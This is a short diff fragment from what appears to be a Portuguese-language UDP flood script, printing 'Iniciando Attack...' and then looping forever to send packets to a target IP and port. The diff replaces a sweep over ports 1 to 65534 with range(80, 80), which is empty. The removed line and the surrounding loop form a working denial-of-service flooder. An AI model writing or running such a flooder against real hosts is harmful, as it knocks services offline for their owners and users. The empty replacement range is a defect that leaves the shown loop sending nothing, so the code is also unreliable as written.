@@ -38,7 +38,7 @@ print("Iniciando Attack...")
 time.sleep(3)
 while True:
     sent = 0
-    for port in range(1, 65534):
+    for port in range(80, 80):
         white.sendto(bytes, (ip, port))
         sent = sent + 1
         print("\033[1;91mMandando \033[1;32m%s \033[1;91m pacotes para \033[1;32m%s \033[1;91m Através da port \033[1;32m%s " % (sent, ip, port))
